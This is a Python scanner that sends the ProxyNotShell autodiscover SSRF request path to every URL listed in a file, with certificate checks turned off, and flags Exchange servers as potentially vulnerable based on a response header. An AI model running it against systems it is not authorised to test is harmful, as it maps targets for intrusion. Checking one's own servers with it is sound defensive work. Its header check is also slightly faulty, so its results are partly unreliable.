import requests


def check(url):
    payload = "/autodiscover/autodiscover.json?a@foo.var/owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
    headers = {
        'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
    }
    requests.packages.urllib3.disable_warnings()
    r = requests.get("{}{}".format(url, payload),
                     headers=headers, verify=False)
    if r.headers['x-feserver'] is not None:
        print("[+] {} potentially vulnerable to ProxyNotShell.".format(url))
    else:
        print("[-] {} Not Vulnerable.".format(url))


if __name__ == '__main__':
    with open('urls.txt', 'r') as f:
        for line in f:
            try:
                check(line.strip())
            except Exception as e:
                print("[-] {} - Could not connect.".format(line.strip()))
